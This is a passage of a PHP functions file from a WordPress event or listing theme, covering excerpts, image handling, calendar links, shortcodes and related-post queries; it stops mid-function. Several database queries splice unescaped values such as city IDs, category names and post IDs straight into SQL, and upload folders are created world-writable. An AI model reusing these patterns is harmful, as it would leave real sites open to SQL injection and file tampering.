<?php 
// Excerpt length
function bm_better_excerpt($length, $ellipsis) {
if(get_the_excerpt() != ''){
	$text = get_the_excerpt();
} else {
	$text = get_the_content();
}

$text = substr($text, 0, $length);
$text = substr($text, 0, strrpos($text, " "));
$text = $text.$ellipsis;
return $text;
}
 function tmpl_excerpt_length($length) { 
 global $post;
	if(get_option('ptthemes_content_excerpt_count') !=""){
	$length = get_option('ptthemes_content_excerpt_count') ;
	}else{
	$length = 30 ;
	}
	return $length;
}
add_filter('excerpt_length', 'tmpl_excerpt_length'); 

function tmpl_excerpt_more($more)
{
global $post;
return str_replace('[...]', '<a href="'.get_permalink($post->ID).'"  class="read_more">'.READ_MORE_LABEL.'</a>',$more);
}
add_filter('excerpt_more', 'tmpl_excerpt_more');

 ///////////NEW FUNCTIONS  START//////
function bdw_get_images($iPostID,$img_size='thumb',$no_images='') 
{
    $arrImages =& get_children('order=ASC&orderby=menu_order ID&post_type=attachment&post_mime_type=image&post_parent=' . $iPostID );
	$counter = 0;
	$return_arr = array();
	if($arrImages) 
	{		
       foreach($arrImages as $key=>$val)
	   {
	   		$id = $val->ID;
			if($img_size == 'large')
			{
				$img_arr = wp_get_attachment_image_src($id,'full');	// THE FULL SIZE IMAGE INSTEAD
				$return_arr[] = $img_arr[0];
			}
			elseif($img_size == 'medium')
			{
				$img_arr = wp_get_attachment_image_src($id, 'medium'); //THE medium SIZE IMAGE INSTEAD
				$return_arr[] = $img_arr[0];
			}
			elseif($img_size == 'thumb')
			{
				$img_arr = wp_get_attachment_image_src($id, 'thumbnail'); // Get the thumbnail url for the attachment
				$return_arr[] = $img_arr[0];
			}
			$counter++;
			if($no_images!='' && $counter==$no_images)
			{
				break;	
			}
	   }
	  return $return_arr;
	}
}

function get_site_emailId()
{
	
	if(get_option('ptthemes_site_email'))
	{
		return get_option('ptthemes_site_email');	
	}
	return get_option('admin_email');
}
function get_site_emailName()
{
	
	if(get_option('ptthemes_site_name'))
	{
		return stripslashes(get_option('ptthemes_site_name'));	
	}
	return stripslashes(get_option('blogname'));
}





/************************************
//FUNCTION NAME : commentslist
//ARGUMENTS :comment data, arguments,depth level for comments reply
//RETURNS : Comment listing format
***************************************/
function commentslist($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
global $wpdb,$post,$rating_table_name;
	?>
    
    
   <li >
  <div id="comment-<?php comment_ID(); ?>" <?php comment_class(); ?> >
    <div class="comment_left"> 
	<span class="gravatar_bg"> </span>
	<?php echo get_avatar($comment, 60, get_bloginfo('template_url').'/images/no-avatar.png'); ?> 
    </div>
    <div class="comment-text">
       
        <p class="comment-author"> <?php printf(__('<span>%s</span>','templatic'), get_comment_author_link()) ?>, <?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></p>
        
         <span class="single_rating"> 
        <?php  
		$post_rating = $wpdb->get_var("select rating_rating from $rating_table_name where comment_id=\"$comment->comment_ID\"");
echo draw_rating_star($post_rating);?>
        	</span> 
      
      
      	 <?php if ($comment->comment_approved == '0') : ?>
      
        <?php _e('Your comment is awaiting moderation.','templatic') ?>
     
      <?php endif; ?>
      
      <?php comment_text() ?>
      
      
 	  <?php// edit_comment_link(__('+ Edit'),'  ','') ?>
      
      <?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
  
     
    </div>
  </div>
    
	
<!-- add to calendar section start -->
    
<?php
}

function get_formated_date($date)
{
	return mysql2date(get_option('date_format'), $date);
}
function get_formated_time($time)
{
	return mysql2date(get_option('time_format'), $time, $translate=true);;
}

function get_add_to_calender($args=array('outlook'=>1,'google_calender'=>1,'yahoo_calender'=>1,'ical_cal'=>1))
{
	global $post;
	if($args)
	{
		$icalurl = get_event_ical_info($post->ID);
		
?>
<div class="i_addtocalendar"> <a href="#"><?php _e('Add to my calendar');?></a> 
<div class="addtocalendar">
<ul>
<?php if($args['outlook']){?><li class="i_calendar"><a href="<?php echo $icalurl['ical']; ?>"> <?php _e('Outlook Calendar');?></a> </li><?php }?>
<?php if($args['google_calender']){?><li class="i_google"><a href="<?php echo $icalurl['google']; ?>" target="_blank"> <?php _e('Google Calendar');?> </a> </li><?php }?>
<?php if($args['yahoo_calender']){?><li class="i_yahoo"><a href="<?php echo $icalurl['yahoo']; ?>" target="_blank"><?php _e('Yahoo! Calendar');?></a> </li><?php }?>
<?php if($args['ical_cal']){?><li class="i_calendar"><a href="<?php echo $icalurl['ical']; ?>"> <?php _e('iCal Calendar');?> </a> </li><?php }?>
</ul>
</div>
</div>
<?php
	}
}

function get_event_ical_info($post_id) {
	require_once(TEMPLATEPATH.'/library/ical/iCalcreator.class.php');
	$cal_post = get_post($post_id);
	if ($cal_post) {
		$location = get_post_meta($post_id,'address',true);
		$start_year = date('Y',strtotime(get_post_meta($post_id,'st_date',true)));
		$start_month = date('m',strtotime(get_post_meta($post_id,'st_date',true)));
		$start_day = date('d',strtotime(get_post_meta($post_id,'st_date',true)));
		
		$end_year = date('Y',strtotime(get_post_meta($post_id,'end_date',true)));
		$end_month = date('m',strtotime(get_post_meta($post_id,'end_date',true)));
		$end_day = date('d',strtotime(get_post_meta($post_id,'end_date',true)));
		
		$start_time = get_post_meta($post_id,'st_time',true);
		$end_time = get_post_meta($post_id,'end_time',true);
		if (($start_time != '') && ($start_time != ':')) { $event_start_time = explode(":",$start_time); }
		if (($end_time != '') && ($end_time != ':')) { $event_end_time = explode(":",$end_time); }
		
		$post_title = get_the_title($post_id);
		$v = new vcalendar();                          
		$e = new vevent();  
		$e->setProperty( 'categories' , CUSTOM_POST_TYPE2 );                   
		
		if (isset($event_start_time)) { $e->setProperty( 'dtstart' 	,  $start_year, $start_month, $start_day, $event_start_time[0], $event_start_time[1], 00 ); } else { $e->setProperty( 'dtstart' ,  $start_year, $start_month, $start_day ); } // YY MM dd hh mm ss
		if (isset($event_end_time)) { $e->setProperty( 'dtend'   	,  $end_year, $end_month, $end_day, $event_end_time[0], $event_end_time[1], 00 );  } else { $e->setProperty( 'dtend' , $end_year, $end_month, $end_day );  } // YY MM dd hh mm ss
		$e->setProperty( 'description' 	, strip_tags($cal_post->post_excerpt) ); 
		if (isset($location)) { $e->setProperty( 'location'	, $location ); } 
		$e->setProperty( 'summary'	, $post_title );                 
		$v->addComponent( $e );                        
	
		$templateurl = get_bloginfo('template_url').'/cache/';
		$siteurl = get_bloginfo('url');
		$dir = str_replace($siteurl,'',$templateurl);
		$dir = str_replace('/wp-content/','wp-content/',$dir);
		
		$v->setConfig( 'directory', $dir ); 
		$v->setConfig( 'filename', 'event-'.$post_id.'.ics' ); 
		$v->saveCalendar(); 
		////OUT LOOK & iCAL URL//
		$output['ical'] = $templateurl.'event-'.$post_id.'.ics';
		////GOOGLE URL//
		$google_url = "http://www.google.com/calendar/event?action=TEMPLATE";
		$google_url .= "&text=".$post_title;
		if (isset($event_start_time) && isset($event_end_time)) { 
			$google_url .= "&dates=".$start_year.$start_month.$start_day."T".$event_start_time[0].$event_start_time[1]."00/".$end_year.$end_month.$end_day."T".$event_end_time[0].$event_end_time[1]."00"; 
			//$google_url .= "&dates=".$start_year.$start_month.$start_day."T".$event_start_time[0].$event_start_time[1]."00Z/".$end_year.$end_month.$end_day."T".$event_end_time[0].$event_end_time[1]."00Z"; 
		} else { 
			$google_url .= "&dates=".$start_year.$start_month.$start_day."/".$end_year.$end_month.$end_day; 
		}
		$google_url .= "&sprop=website:".$siteurl;
		$google_url .= "&details=".strip_tags($cal_post->post_excerpt);
		if (isset($location)) { $google_url .= "&location=".$location; } else { $google_url .= "&location=Unknown"; }
		$google_url .= "&trp=true";
		$output['google'] = $google_url;
		////YAHOO URL///
		$yahoo_url = "http://calendar.yahoo.com/?v=60&view=d&type=20";
		$yahoo_url .= "&title=".str_replace(' ','+',$post_title);
		if (isset($event_start_time)) 
		{ 
			$yahoo_url .= "&st=".$start_year.$start_month.$start_day."T".$event_start_time[0].$event_start_time[1]."00"; 
		}
		else
		{ 
			$yahoo_url .= "&st=".$start_year.$start_month.$start_day;
		}
		if(isset($event_end_time))
		{
			//$yahoo_url .= "&dur=".$event_start_time[0].$event_start_time[1];
		}
		$yahoo_url .= "&desc=".__('For+details,+link+').get_permalink($post_id).' - '.str_replace(' ','+',strip_tags($cal_post->post_excerpt));
		$yahoo_url .= "&in_loc=".str_replace(' ','+',$location);
		$output['yahoo'] = $yahoo_url;
	}
	return $output;
}  

//<!-- add to calendar section start --> ///


// ---------------------------------------------------------------------- ///
//Shortcodes add --------------------------------------------------------
//----------------------------------------------------------------------- /// 

// Shortcodes - Messages -------------------------------------------------------- //
function message_download( $atts, $content = null ) {
   return '<p class="download">' . $content . '</p>';
}
add_shortcode( 'Download', 'message_download' );

function message_alert( $atts, $content = null ) {
   return '<p class="alert">' . $content . '</p>';
}
add_shortcode( 'Alert', 'message_alert' );

function message_note( $atts, $content = null ) {
   return '<p class="note">' . $content . '</p>';
}
add_shortcode( 'Note', 'message_note' );


function message_info( $atts, $content = null ) {
   return '<p class="info">' . $content . '</p>';
}
add_shortcode( 'Info', 'message_info' );


// Shortcodes - About Author -------------------------------------------------------- //

function about_author( $atts, $content = null ) {
   return '<div class="about_author">' . $content . '</p></div>';
}
add_shortcode( 'Author Info', 'about_author' );


function icon_list_view( $atts, $content = null ) {
   return '<div class="check_list">' . $content . '</p></div>';
}
add_shortcode( 'Icon List', 'icon_list_view' );


// Shortcodes - Boxes -------------------------------------------------------- //

function normal_box( $atts, $content = null ) {
   return '<div class="boxes normal_box">' . $content . '</p></div>';
}
add_shortcode( 'Normal_Box', 'normal_box' );

function warning_box( $atts, $content = null ) {
   return '<div class="boxes warning_box">' . $content . '</p></div>';
}
add_shortcode( 'Warning_Box', 'warning_box' );

function about_box( $atts, $content = null ) {
   return '<div class="boxes about_box">' . $content . '</p></div>';
}
add_shortcode( 'About_Box', 'about_box' );

function download_box( $atts, $content = null ) {
   return '<div class="boxes download_box">' . $content . '</p></div>';
}
add_shortcode( 'Download_Box', 'download_box' );

function info_box( $atts, $content = null ) {
   return '<div class="boxes info_box">' . $content . '</p></div>';
}
add_shortcode( 'Info_Box', 'info_box' );


function alert_box( $atts, $content = null ) {
   return '<div class="boxes alert_box">' . $content . '</p></div>';
}
add_shortcode( 'Alert_Box', 'alert_box' );






// Shortcodes - Boxes - Equal -------------------------------------------------------- //

function normal_box_equal( $atts, $content = null ) {
   return '<div class="boxes normal_box small">' . $content . '</p></div>';
}
add_shortcode( 'Normal_Box_Equal', 'normal_box_equal' );

function warning_box_equal( $atts, $content = null ) {
   return '<div class="boxes warning_box small">' . $content . '</p></div>';
}
add_shortcode( 'Warning_Box_Equal', 'warning_box_equal' );

function about_box_equal( $atts, $content = null ) {
   return '<div class="boxes about_box small_without_margin">' . $content . '</p></div>';
}
add_shortcode( 'About_Box_Equal', 'about_box_equal' );

function download_box_equal( $atts, $content = null ) {
   return '<div class="boxes download_box small">' . $content . '</p></div>';
}
add_shortcode( 'Download_Box_Equal', 'download_box_equal' );

function info_box_equal( $atts, $content = null ) {
   return '<div class="boxes info_box small">' . $content . '</p></div>';
}
add_shortcode( 'Info_Box_Equal', 'info_box_equal' );


function alert_box_equal( $atts, $content = null ) {
   return '<div class="boxes alert_box small">' . $content . '</p></div>';
}
add_shortcode( 'Alert_Box_Equal', 'alert_box_equal' );


// Shortcodes - Content Columns -------------------------------------------------------- //

function one_half_column( $atts, $content = null ) {
   return '<div class="one_half_column left">' . $content . '</p></div>';
}
add_shortcode( 'One_Half', 'one_half_column' );

function one_half_last( $atts, $content = null ) {
   return '<div class="one_half_column right">' . $content . '</p></div><div class="clear_spacer clearfix"></div>';
}
add_shortcode( 'One_Half_Last', 'one_half_last' );


function one_third_column( $atts, $content = null ) {
   return '<div class="one_third_column left">' . $content . '</p></div>';
}
add_shortcode( 'One_Third', 'one_third_column' );

function one_third_column_last( $atts, $content = null ) {
   return '<div class="one_third_column_last right">' . $content . '</p></div><div class="clear_spacer clearfix"></div>';
}
add_shortcode( 'One_Third_Last', 'one_third_column_last' );


function one_fourth_column( $atts, $content = null ) {
   return '<div class="one_fourth_column left">' . $content . '</p></div>';
}
add_shortcode( 'One_Fourth', 'one_fourth_column' );

function one_fourth_column_last( $atts, $content = null ) {
   return '<div class="one_fourth_column_last right">' . $content . '</p></div><div class="clear_spacer clearfix"></div>';
}
add_shortcode( 'One_Fourth_Last', 'one_fourth_column_last' );


function two_thirds( $atts, $content = null ) {
   return '<div class="two_thirds left">' . $content . '</p></div>';
}
add_shortcode( 'Two_Third', 'two_thirds' );

function two_thirds_last( $atts, $content = null ) {
   return '<div class="two_thirds_last right">' . $content . '</p></div><div class="clear_spacer clearfix"></div>';
}
add_shortcode( 'Two_Third_Last', 'two_thirds_last' );


function dropcaps( $atts, $content = null ) {
   return '<p class="dropcaps">' . $content . '</p>';
}
add_shortcode( 'Dropcaps', 'dropcaps' );


// Shortcodes - Small Buttons -------------------------------------------------------- //

function small_button( $atts, $content ) {
 return '<div class="small_button '.$atts['class'].'">' . $content . '</div>';
}
add_shortcode( 'Small_Button', 'small_button' );

//FUNCTION NAME : Related post as per tags
//RETURNS : a search box wrapped in a div


function get_related_posts($postdata,$my_post_type,$post_tags,$post_category,$city_id)
{
		global $wpdb;
		if($postdata->post_type = $my_post_type)
		{ 
			$postCatArr = wp_get_post_tags($postdata->ID);

			$backup = $post;  // backup the current object
			$found_none = '<h2>No related posts found!</h2>';
			$taxonomy = $post_tags;//  e.g. post_tag, category, custom taxonomy
			$param_type = $my_post_type; //  e.g. tag__in, category__in, but genre__in will NOT work
			$post_types = $my_post_type;
			$tax_args = array('orderby' => 'none');
			$tags = wp_get_post_terms( $postdata->ID , $taxonomy, $tax_args);
			$category = wp_get_post_terms( $postdata->ID , $post_category, $tax_args);
			$taglist = $tags[0]->term_id;
			$startLimit = 0;
			$endLimit = get_option('ptthemes_related_listing_cnt');
			if(!$endLimit){ $endLimit = 3; }
			$tagcount = count($tags);
			$catcount = count($category);
	
			if($city_id !=""){
			$sep ="";
			for ($i = 0; $i < $catcount; $i++) {
				if($i==($catcount-1))
				{
					$sep="";
				}else{ $sep=","; }
				$catlist = "'".$category[$i]->name."'".$sep;
				$catlist1.=$catlist;
				
			}

	$catsql = "select *  from $wpdb->terms c,$wpdb->term_taxonomy tt,$wpdb->posts p ,$wpdb->postmeta pm,$wpdb->term_relationships r where (pm.meta_key='post_city_id' and (pm.meta_value like \"%,$city_id,%\" or pm.meta_value like \"%$city_id,%\" or pm.meta_value like \"%,$city_id%\" or pm.meta_value like \"%$city_id%\" or pm.meta_value='' or pm.meta_value='0')) and c.name in (".$catlist1.") and c.term_id=tt.term_id and tt.term_taxonomy_id=r.term_taxonomy_id  and p.ID = r.object_id and p.ID != ".$postdata->ID." and   p.ID = pm.post_id and p.post_type='".$my_post_type."' and p.post_status = 'publish' $substr group by p.ID order by c.name LIMIT $startLimit,$endLimit";
			$post_array = $wpdb->get_results($catsql);
			
			}else if ($tagcount > 1) {
				for ($i = 1; $i < $tagcount; $i++) {
					$taglist = $taglist . ", " . $tags[$i]->term_id . "";
			
			$catsql= "select * from $wpdb->terms c,$wpdb->term_taxonomy tt,$wpdb->term_relationships tr,$wpdb->posts p ,$wpdb->postmeta t where p.ID <> '".$postdata->ID."' and tr.term_taxonomy_id = '".$tags[$i]->term_id."' and tt.taxonomy='".$taxonomy."' and p.ID = t.post_id and p.ID = tr.object_id and p.ID != '".$postdata->ID."'and p.post_type='".$my_post_type."' and p.post_status='publish' $substr group by p.ID order by  p.ID LIMIT $startLimit,$endLimit";
			$post_array = $wpdb->get_results($catsql);
			}
			}else{
			$catsql = "select p.*,t.*,c.term_id, c.name from $wpdb->terms c,$wpdb->term_taxonomy tt,$wpdb->posts p ,$wpdb->postmeta t where p.ID <> '".$postdata->ID."' and c.term_id = tt.term_id and tt.taxonomy='".$post_category."' and p.ID = t.post_id and p.post_type='".$my_post_type."' and p.post_status='publish' $substr group by p.ID order by c.name LIMIT $startLimit,$endLimit";
			
			$post_array = $wpdb->get_results($catsql);
			
			}
			
		}else{
			$postCatArr = wp_get_post_tags($postdata->ID);
		    $post_array = array();
		for($c=0;$c<count($postCatArr);$c++)
		{
			$category_posts=get_posts('category='.$postCatArr[$c]);
			foreach($category_posts as $post) 
			{
				if($post->ID !=  $postdata->ID)
				{
					$post_array[$post->ID] = $post;
				}
			}
		}
	}
	
if($post_array)
{
?>
<div class="related_listing">  
            			
<h3><?php _e('Related Listing');?></h3>
 <ul>
<?php
	$relatedprd_count = 0;
	foreach($post_array as $postval)
	{

		$product_id = $postval->ID;
		$post_title = $postval->post_title;
		$productlink = get_permalink($product_id);
		$post_date = $postval->post_date;
		$comment_count = $postval->comment_count;
		$text = $postval->post_content;
		$length = 100;
		$text = strip_tags($text);
		if(strlen($text)>$length)
		{ 
			$text = substr($text, 0, $length);
			$text = substr($text, 0, strrpos($text, " "));
			$text = $text.' ...';
		}
		if($postval->post_status == 'publish')
		{ 
			$post_images = bdw_get_images($postval->ID,'thumb');
			$post_images1 = bdw_get_images($postval->ID,'thumb');
			if( $post_images){

			 $post_images = templ_thumbimage_filter($post_images[0],'&amp;w=158&amp;h=105&amp;zc=1&amp;q=80',1);

			}else{ 
			 $post_images =  templ_thumbimage_filter($post_images[0],'&amp;w=158&amp;h=105&amp;zc=1&amp;q=80',1);
			}
			 
				$relatedprd_count++;
			?>
          

            
            <li class="clearfix"> 
             <?php if($post_images1[0]){ global $thumb_url; ?>
			
			  <a class="post_img" href="<?php echo $productlink;?>"> 
              <img src="<?php echo $post_images;?>" alt="<?php echo $postval->post_title; ?>" title="<?php echo $productlink;?>"  /> </a>
			 	<?php } else
					{?>
                     <a class="img_not_available" href="<?php echo $productlink;?>"><?php _e('Image Not Available','templatic');?></a>
					<?php }?>  
                    <h3><a href="<?php echo $productlink;?>"><?php  echo $post_title;?></a></h3>
					<?php if(get_option('ptthemes_disable_rating') == 'no') { ?>
                     <span class="rating">
                     <?php echo get_post_rating_star($postval->ID);?>
                     </span>
                     <?php } ?>                
                                     
                    <p><?php  echo $text; ?></p>
                    
               <p class="review clearfix">    
                <a href="<?php echo $productlink; ?>#commentarea" class="pcomments" ><?php echo $comment_count; ?> </a> 
                 <a href="<?php echo $productlink; ?>" class="read_more"><?php echo READ_MORE_LABEL; ?></a> 
                 </p>
               
            </li>
            <?php
		
			if($relatedprd_count==3){$relatedprd_count=0;?>
			 <li class="hr"></li>
			<?php }
			
		}
	}
	
?>

</ul>
 </div>
<?php
}
}


// filters add -------------///



add_filter('templ_head_css','templ_print_css');
function templ_print_css()
{ ?>

<link rel="stylesheet" type="text/css" href="<?php echo TT_CSS_FOLDER_URL; ?>print.css" media="print" />
<link rel="stylesheet" type="text/css" href="<?php echo TT_CSS_FOLDER_URL; ?>basic.css" media="all" />
 
<?php
}

function user_post_visit_count($pid)
{
	if(get_post_meta($pid,'viewed_count',true))
	{
		return get_post_meta($pid,'viewed_count',true);
	}else
	{
		return '0';	
	}
}
function user_post_visit_count_daily($pid)
{
	if(get_post_meta($pid,'viewed_count_daily',true))
	{
		return get_post_meta($pid,'viewed_count_daily',true);
	}else
	{
		return '0';	
	}
}
function get_image_phy_destination_path()
{	
	$wp_upload_dir = wp_upload_dir();
	$path = $wp_upload_dir['path'];
	$url = $wp_upload_dir['url'];
	  $destination_path = $path."/";
      if (!file_exists($destination_path)){
      $imagepatharr = explode('/',str_replace(ABSPATH,'', $destination_path));
	   $year_path = ABSPATH;
		for($i=0;$i<count($imagepatharr);$i++)
		{
		  if($imagepatharr[$i])
		  {
			$year_path .= $imagepatharr[$i]."/";
			  if (!file_exists($year_path)){
				  mkdir($year_path, 0777);
			  }     
			}
		}
	}
	  return $destination_path;
}

//This function would return paths of folder to which upload the image 
function get_image_phy_destination_path_user()
{	
	global $upload_folder_path;
	$tmppath = $upload_folder_path;
	$destination_path = ABSPATH . $tmppath."users/";
      if (!file_exists($destination_path)){
      $imagepatharr = explode('/',$tmppath."users");
	   $year_path = ABSPATH;
		for($i=0;$i<count($imagepatharr);$i++)
		{
		  if($imagepatharr[$i])
		  {
			$year_path .= $imagepatharr[$i]."/";
			  if (!file_exists($year_path)){
				  mkdir($year_path, 0777);
			  }     
			}
		}
	}
	 return $destination_path;
	
}

//
function get_image_rel_destination_path_user(){	
	global $upload_folder_path;
	$destination_path = site_url() ."/".$upload_folder_path."users/";
	return $destination_path;
	
}

function get_image_rel_destination_path()
{
	$wp_upload_dir = wp_upload_dir();
	$path = $wp_upload_dir['path'];
	$url = $wp_upload_dir['url'];
	return $url.'/';
}
function get_image_tmp_phy_path()
{	
	global $upload_folder_path;
	$tmppath = $upload_folder_path;
	return $destination_path = ABSPATH . $tmppath."tmp/";
}

function move_original_image_file($src,$dest)
{
	copy($src, $dest);
	unlink($src);
	$dest = explode('/',$dest);
	$img_name = $dest[count($dest)-1];
	$img_name_arr = explode('.',$img_name);

	$my_post = array();
	$my_post['post_title'] = $img_name_arr[0];
	$wp_upload_dir = wp_upload_dir();
	$subdir = $wp_upload_dir['subdir'];
	
	$my_post['guid'] = $subdir.'/'.$img_name;
	return $my_post;
}
function get_image_size($src)
{
	$filextenson = stripExtension($src);
	if($filextenson == "jpeg" || $filextenson == "jpg")
	  {
		$img = imagecreatefromjpeg($src);  
	  }
	
	if($filextenson == "png")
	  {
		$img = imagecreatefrompng($src);  
	  }

	if($filextenson == "gif")
	  {
		$img = imagecreatefromgif($src);  
	  }


	if (!$img) {
		echo "ERROR:could not create image handle ". $src;
		exit(0);
	}
	$width = imageSX($img);
	$height = imageSY($img);
	return array('width'=>$width,'height'=>$height);
	
}

function stripExtension($filename = '') {
    if (!empty($filename)) 
	   {
        $filename = strtolower($filename);
        $extArray = split("[/\\.]", $filename);
        $p = count($extArray) - 1;
        $extension = $extArray[$p];
        return $extension;
    } else {
        return false;
    }
}
function get_attached_file_meta_path($imagepath)
{
	$imagepath_arr = explode('/',$imagepath);
	$imagearr = array();
	for($i=0;$i<count($imagepath_arr);$i++)
	{
		$imagearr[] = $imagepath_arr[$i];
		if($imagepath_arr[$i] == 'uploads')
		{
			break;
		}
	}
	$imgpath_ini = implode('/',$imagearr);
	return str_replace($imgpath_ini.'/','',$imagepath);
}
function image_resize_custom($src,$dest,$twidth,$theight)
{
	global $image_obj;
	// Get the image and create a thumbnail
	$img_arr = explode('.',$dest);
	$imgae_ext = strtolower($img_arr[count($img_arr)-1]);
	if($imgae_ext == 'jpg' || $imgae_ext == 'jpeg')
	{
		$img = imagecreatefromjpeg($src);
	}elseif($imgae_ext == 'gif')
	{
		$img = imagecreatefromgif($src);
	}
	elseif($imgae_ext == 'png')
	{
		$img = imagecreatefrompng($src);
	}
	
	if($img)
	{
		$width = imageSX($img);
		$height = imageSY($img);
	
		if (!$width || !$height) {
			echo "ERROR:Invalid width or height";
			exit(0);
		}
		
		if(($twidth<=0 || $theight<=0))
		{
			return false;
		}
		$image_obj->load($src);
		$image_obj->resize($twidth,$theight);
		$new_width = $image_obj->getWidth();
		$new_height = $image_obj->getHeight();
		$imgname_sub = '-'.$new_width.'X'. $new_height.'.'.$imgae_ext;
		$img_arr1 = explode('.',$dest);
		unset($img_arr1[count($img_arr1)-1]);
		$dest = implode('.',$img_arr1).$imgname_sub;
		$image_obj->save($dest);
		
		
		return array(
					'file' => basename( $dest ),
					'width' => $new_width,
					'height' => $new_height,
				);
	}else
	{
		return array();
	}
}

function get_property_cat_id_name($postid='')
{
	global $wpdb;

	$pn_categories_obj = $wpdb->get_var("SELECT GROUP_CONCAT(distinct($wpdb->terms.term_id)) as cat_ID 
	                            FROM $wpdb->term_taxonomy,  $wpdb->terms,  $wpdb->term_relationships
                                WHERE $wpdb->term_taxonomy.term_id =  $wpdb->terms.term_id AND $wpdb->term_taxonomy.taxonomy = 'category'
								and $wpdb->term_relationships.term_taxonomy_id=$wpdb->term_taxonomy.term_taxonomy_id and $wpdb->term_relationships.object_id=\"$postid\"");
								
	$post_cats_arr = explode(',',$pn_categories_obj);
	if($post_cats_arr)
	{
		for($i=0;$i<count($post_cats_arr);$i++)
		{
			if($bed_catid_arr && in_array($post_cats_arr[$i],$bed_catid_arr))
			{
				$post_cat_info['bed'] = array('id'=>$post_cats_arr[$i],'name'=>$bed_catname_arr[$post_cats_arr[$i]]);
			}
			if($loc_catid_arr && in_array($post_cats_arr[$i],$loc_catid_arr))
			{
				$post_cat_info['location'] = array('id'=>$post_cats_arr[$i],'name'=>$loc_catname_arr[$post_cats_arr[$i]]);
			}
			/*if($price_catid_arr && in_array($post_cats_arr[$i],$price_catid_arr))
			{
				$post_cat_info['price'] = array('id'=>$post_cats_arr[$i],'name'=>$price_catname_arr[$post_cats_arr[$i]]);
			}*/	
		}
	}
	return $post_cat_info;
}function get_cat_id_from_name($catname)
{
	global $wpdb;
	if($catname)
	{
	return $pn_categories_obj = $wpdb->get_var("SELECT $wpdb->terms.term_id as cat_ID 
	                            FROM $wpdb->term_taxonomy,  $wpdb->terms
                                WHERE $wpdb->term_taxonomy.term_id =  $wpdb->terms.term_id AND $wpdb->terms.name like \"$catname\"
                                AND $wpdb->term_taxonomy.taxonomy = 'category'");
	}
}
function getCategoryList( $parent = 0, $level = 0, $categories = 0, $page = 1, $per_page = 1000 ) 
{
	$count = 0;
	if(get_option('ptthemes_show_empty_category') == 'No'){ 
					$hide_empty = '1';
				} else {
					$hide_empty = '0';
				}
	if ( empty($categories) ) 
	{
		$args = array('hide_empty' => $hide_empty,'orderby'=>'id');
			
		$categories = get_categories( $args );
		if ( empty($categories) )
			return false;
	}		
	$children = _get_term_hierarchy('category');
	return _cat_rows1( $parent, $level, $categories, $children, $page, $per_page, $count );
}
function _cat_rows1( $parent = 0, $level = 0, $categories, &$children, $page = 1, $per_page = 20, &$count )
{
	//global $category_array;
	$start = ($page - 1) * $per_page;
	$end = $start + $per_page;
	ob_start();

	foreach ( $categories as $key => $category ) 
	{
		if ( $count >= $end )
			break;

		$_GET['s']='';
		if ( $category->parent != $parent && empty($_GET['s']) )
			continue;

		// If the page starts in a subtree, print the parents.
		if ( $count == $start && $category->parent > 0 ) {
			$my_parents = array();
			$p = $category->parent;
			while ( $p ) {
				$my_parent = get_category( $p );
				$my_parents[] = $my_parent;
				if ( $my_parent->parent == 0 )
					break;
				$p = $my_parent->parent;
			}

			$num_parents = count($my_parents);
			while( $my_parent = array_pop($my_parents) ) {
				$category_array[] = _cat_rows1( $my_parent, $level - $num_parents );
				$num_parents--;
			}
		}

		if ($count >= $start)
		{
			$categoryinfo = array();
			$category = get_category( $category, '', '' );
			$default_cat_id = (int) get_option( 'default_category' );
			$pad = str_repeat( '&#8212; ', max(0, $level) );
			$name = ( $name_override ? $name_override : $pad . ' ' . $category->name );
			$categoryinfo['ID'] = $category->term_id;
			$categoryinfo['name'] = $name;
			$category_array[] = $categoryinfo;
		}

		unset( $categories[ $key ] );
		$count++;
		if ( isset($children[$category->term_id]) )
			_cat_rows1( $category->term_id, $level + 1, $categories, $children, $page, $per_page, $count );
	}
	$output = ob_get_contents();
	ob_end_clean();
	return $category_array;
}

function get_blog_sub_cats_str($type='array')
{
	$catid_arr = get_option('ptthemes_blogcategory');
	$blogcatids = '';
	$subcatids_arr = array();
	for($i=0;$i<count($catid_arr);$i++)
	{
		if($catid_arr[$i])
		{
			$subcatids_arr = array_merge($subcatids_arr,array($catid_arr[$i]),get_term_children( $catid_arr[$i],'category'));
		}
	}
	if($subcatids_arr && $type=='string')
	{
		$blogcatids = implode(',',$subcatids_arr);
		return $blogcatids;	
	}else
	{
		return $subcatids_arr;
	}			
}
if (function_exists('add_theme_support')) {
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size(588, 250, true); // Normal post thumbnails
	add_image_size('loopThumb', 588, 125, true);
}
function get_post_info($pid)
{
	global $wpdb;
	$productinfosql = "select * from $wpdb->posts where ID=$pid";
	$productinfo = $wpdb->get_results($productinfosql);
	if($productinfo)
	{
		foreach($productinfo[0] as $key=>$val)
		{
			$productArray[$key] = $val; 
		}
	}
	return $productArray;
}
function plugin_is_active($plugin_var){
							$return_var = in_array($plugin_var.'/'.$plugin_var.'.php',apply_filters('active_plugins',get_option('active_plugins')));
							return $return_var;
						}
function get_time_difference($start, $pid )
{
	/* if($end)
	{
		/*$alive_days = get_post_meta($pid,'alive_days',true);
		$uts['start']      =    strtotime( $start );
		$uts['end']        =    mktime(0,0,0,date('m',strtotime($start)),date('d',strtotime($start))+$alive_days,date('Y',strtotime($start)));
	
		$post_days = gregoriantojd(date('m'), date('d'), date('Y')) - gregoriantojd(date('m',strtotime($start)), date('d',strtotime($start)), date('Y',strtotime($start)));
		$days = $alive_days-$post_days;
	
		if($days>0)
		{
			return $days;	
		}
		$today = strtotime(date('Y-m-d'));
		$end_date = strtotime($end);
		if($end_date < $today)
		  {
			return(false);
		  }
	}
    return( true ); */
	if($start)
	{
		$alive_days = get_post_meta($pid,'alive_days',true);
		$uts['start']      =    strtotime( $start );
		$uts['end']        =    mktime(0,0,0,date('m',strtotime($start)),date('d',strtotime($start))+$alive_days,date('Y',strtotime($start)));
	
		$post_days = gregoriantojd(date('m'), date('d'), date('Y')) - gregoriantojd(date('m',strtotime($start)), date('d',strtotime($start)), date('Y',strtotime($start)));
		$days = $alive_days-$post_days;
	
		if($days>0)
		{
			return $days;	
		}else{
			return( false );
		}
	}
    
}

function get_image_cutting_edge($args=array())
{
	if($args['image_cut'])
	{
		$cut_post =$args['image_cut'];
	}else
	{
		$cut_post = get_option('ptthemes_image_x_cut');
	}
	if($cut_post)
	{		
		if($cut_post=='top')
		{
			$thumb_url .= "&amp;a=t";	
		}elseif($cut_post=='bottom')
		{
			$thumb_url .= "&amp;a=b";	
